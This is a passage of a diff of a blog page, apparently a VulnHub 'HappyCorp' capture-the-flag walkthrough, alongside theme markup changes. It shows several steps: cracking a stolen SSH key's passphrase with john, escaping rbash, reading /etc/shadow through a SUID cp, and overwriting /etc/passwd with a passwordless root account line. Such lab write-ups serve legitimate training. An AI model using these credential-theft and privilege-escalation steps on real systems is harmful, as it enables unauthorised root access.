-</code></pre></div><p>I planned to create another ssh keypair that I controlled and to add the public key to the <code>authorized_keys</code> file in karl&rsquo;s home directory, but I only had read permissions for the entire share. The next plan was to make a copy of the private key (id_rsa) and use that to ssh in as karl.</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># As karl
+</code></pre><p>I planned to create another ssh keypair that I controlled and to add the public key to the <code>authorized_keys</code> file in karl&rsquo;s home directory, but I only had read permissions for the entire share. The next plan was to make a copy of the private key (id_rsa) and use that to ssh in as karl.</p>
+<pre><code># As karl
 $ cp id_rsa /home/kali/Documents/vulnhub/happycorp1
 
 # Back to kali user
 kali@kali:~/Documents/vulnhub/happycorp1$ ssh karl@192.168.1.189 -i id_rsa
-Enter passphrase for key &#39;id_rsa&#39;:
-</code></pre></div><p>The private key was protected by a password. Cracking this with <code>john</code> thankfully didn&rsquo;t take too long. I used <code>ssh2john.py</code> to hash the private key and used the rockyou wordlist to crack the password:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Documents/vulnhub/happycorp1$ /usr/share/john/ssh2john.py id_rsa id_rsa.hash
-</code></pre></div><p><img src="/static/happycorp/8.png" alt=""></p>
+Enter passphrase for key 'id_rsa':
+</code></pre><p>The private key was protected by a password. Cracking this with <code>john</code> thankfully didn&rsquo;t take too long. I used <code>ssh2john.py</code> to hash the private key and used the rockyou wordlist to crack the password:</p>
+<pre><code>kali@kali:~/Documents/vulnhub/happycorp1$ /usr/share/john/ssh2john.py id_rsa id_rsa.hash
+</code></pre><p><img loading="lazy" src="/static/happycorp/8.png" alt=""  />
+</p>
 <p>I ssh&rsquo;d in as karl and had to wait a few seconds whilst some weird error messages appeared:</p>
-<p><img src="/static/happycorp/9.png" alt=""></p>
+<p><img loading="lazy" src="/static/happycorp/9.png" alt=""  />
+</p>
 <p>After searching around for some explanation I came to a conclusion that either rbash or bash (or something) was stuck in a loop. I couldn&rsquo;t exit but after some keyboard smashing (lots of Ctrl+C and <code>exit</code>s) I got into a working <code>rbash</code> shell. I couldn&rsquo;t <code>cd</code> around but that didn&rsquo;t stop me from looking at files using their full path. I wanted to take a look at <code>admin.php</code> to confirm my earlier presumptions about the hardcoded password (plus hydra still hadn&rsquo;t found the password):</p>
-<p><img src="/static/happycorp/10.png" alt=""></p>
+<p><img loading="lazy" src="/static/happycorp/10.png" alt=""  />
+</p>
 <p>The slowness that I experienced when I was trying to log into the admin page now made sense given the <code>sleep(3)</code>. The password also was hardcoded as suggested by Rodney&rsquo;s comment.</p>
 <p>I logged in to the admin page using the now retrieved credentials but I didn&rsquo;t find much, just a few passive-aggressive remarks by Rodney in a barely functional CMS:</p>
 <p><code>cms.php</code>:
-<img src="/static/happycorp/11.png" alt=""></p>
+<img loading="lazy" src="/static/happycorp/11.png" alt=""  />
+</p>
 <p><code>home.php</code>:
-<img src="/static/happycorp/12.png" alt=""></p>
+<img loading="lazy" src="/static/happycorp/12.png" alt=""  />
+</p>
 <p><code>backup.php</code>:
-<img src="/static/happycorp/13.png" alt=""></p>
+<img loading="lazy" src="/static/happycorp/13.png" alt=""  />
+</p>
 <p>This avenue didn&rsquo;t lead anywhere so I shifted my attention back to the access I had to karl&rsquo;s account. I downloaded a copy of <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">LinEnum</a> to karl&rsquo;s home directory but rbash didn&rsquo;t let me run it. I backed out and ssh&rsquo;d in again, this time using <code>-t</code> to force a shell.</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Documents/vulnhub/happycorp1$ ssh karl@192.168.1.189 -i id_rsa -t /bin/sh
-</code></pre></div><p>This worked and I now had a basic unrestricted shell to mess around with. I ran <code>LinEnum</code> which found that <code>cp</code> had a SUID bit set:</p>
-<p><img src="/static/happycorp/14.png" alt=""></p>
+<pre><code>kali@kali:~/Documents/vulnhub/happycorp1$ ssh karl@192.168.1.189 -i id_rsa -t /bin/sh
+</code></pre><p>This worked and I now had a basic unrestricted shell to mess around with. I ran <code>LinEnum</code> which found that <code>cp</code> had a SUID bit set:</p>
+<p><img loading="lazy" src="/static/happycorp/14.png" alt=""  />
+</p>
 <p>I verified this by making a copy of <code>/etc/shadow</code> and viewing it:</p>
-<p><img src="/static/happycorp/15.png" alt=""></p>
+<p><img loading="lazy" src="/static/happycorp/15.png" alt=""  />
+</p>
 <p>I couldn&rsquo;t get access to root&rsquo;s home directory, but given the location of the user flag I assumed the root flag would be somewhere similar, with the name &ldquo;root.txt&rdquo;:</p>
-<p><img src="/static/happycorp/16.png" alt=""></p>
+<p><img loading="lazy" src="/static/happycorp/16.png" alt=""  />
+</p>
 <p>Although I had the flag I still didn&rsquo;t have full root-level access, so to finish the job I made a copy of <code>/etc/passwd</code> and added the following line:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">hacker::0:0:root:/root:/bin/bash
-</code></pre></div><p>I had to copy the copy of <code>/etc/passwd</code> to my local machine (using <code>python -m http.server</code>) so that I could edit it. This was because <code>cp</code> has the SUID bit set and the copy of <code>/etc/passwd</code> has read-only root privilege so I couldn&rsquo;t edit it on the box. Once I made the edit I used the same method to copy the edited <code>/etc/passwd</code> file back to HappyCorp (<code>python -m http.server</code> from my machine and <code>wget</code> from the HappyCorp box) and overwrote the passwd file under <code>/etc</code>:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cp passwd /etc/passwd
-</code></pre></div><p><img src="/static/happycorp/17.png" alt=""></p>
-<h3 id="final-thoughts">Final thoughts</h3>
+<pre><code>hacker::0:0:root:/root:/bin/bash
+</code></pre><p>I had to copy the copy of <code>/etc/passwd</code> to my local machine (using <code>python -m http.server</code>) so that I could edit it. This was because <code>cp</code> has the SUID bit set and the copy of <code>/etc/passwd</code> has read-only root privilege so I couldn&rsquo;t edit it on the box. Once I made the edit I used the same method to copy the edited <code>/etc/passwd</code> file back to HappyCorp (<code>python -m http.server</code> from my machine and <code>wget</code> from the HappyCorp box) and overwrote the passwd file under <code>/etc</code>:</p>
+<pre><code>$ cp passwd /etc/passwd
+</code></pre><p><img loading="lazy" src="/static/happycorp/17.png" alt=""  />
+</p>
+<h3 id="final-thoughts">Final thoughts<a hidden class="anchor" aria-hidden="true" href="#final-thoughts">#</a></h3>
 <p>I enjoyed HappyCorp a lot. I was left scratching my head a couple of times but with the right amount of research, I managed to get to the root flag. Thanks for the challenge Zayotic!</p>
 
-			</div>
-			<div class="tags">
-				
-				
-				
-				
-					
-				
-					
-				
-				
-			</div></div>
-	</div>
-	<div class="footer wrapper">
-	<nav class="nav">
-		<div class="footertext"></div>
-	</nav>
+</div>
+  <footer class="post-footer">
+<nav class="paginav">
+  <a class="prev" href="/posts/vulnhub-mr-robot/">
+    <span class="title">« Prev Page</span>
+    <br>
+    <span>VulnHub: Mr-Robot</span>
+  </a>
+  <a class="next" href="/posts/vulnhub-sunset-nightfall/">
+    <span class="title">Next Page »</span>
+    <br>
+    <span>VulnHub: Sunset Nightfall</span>
+  </a>
+</nav>
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share VulnHub: HappyCorp on twitter"
+        href="https://twitter.com/intent/tweet/?text=VulnHub%3a%20HappyCorp&amp;url=%2fposts%2fvulnhub-happycorp%2f&amp;hashtags=">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share VulnHub: HappyCorp on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2fposts%2fvulnhub-happycorp%2f&amp;title=VulnHub%3a%20HappyCorp&amp;summary=VulnHub%3a%20HappyCorp&amp;source=%2fposts%2fvulnhub-happycorp%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share VulnHub: HappyCorp on reddit"
+        href="https://reddit.com/submit?url=%2fposts%2fvulnhub-happycorp%2f&title=VulnHub%3a%20HappyCorp">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share VulnHub: HappyCorp on facebook"
+        href="https://facebook.com/sharer/sharer.php?u=%2fposts%2fvulnhub-happycorp%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share VulnHub: HappyCorp on whatsapp"
+        href="https://api.whatsapp.com/send?text=VulnHub%3a%20HappyCorp%20-%20%2fposts%2fvulnhub-happycorp%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share VulnHub: HappyCorp on telegram"
+        href="https://telegram.me/share/url?text=VulnHub%3a%20HappyCorp&amp;url=%2fposts%2fvulnhub-happycorp%2f">
+        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
+            <path
+                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+        </svg>
+    </a>
 </div>
 
+  </footer>
+</article>
+    </main>
+    <footer class="footer">
+    <span>&copy; 2021 <a href="/">PaperMod</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
+    <button class="top-link" id="top-link" type="button" accesskey="g">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z" />
+        </svg>
+    </button>
+</a>
 
+<script>
+    let menu = document.getElementById('menu')
+    menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+    menu.onscroll = function () {
+        localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+    }
 
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerText = 'copy';
+
+        function copyingDone() {
+            copybutton.innerText = 'copied!';
+            setTimeout(() => {
+                copybutton.innerText = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
 </body>
+
 </html>
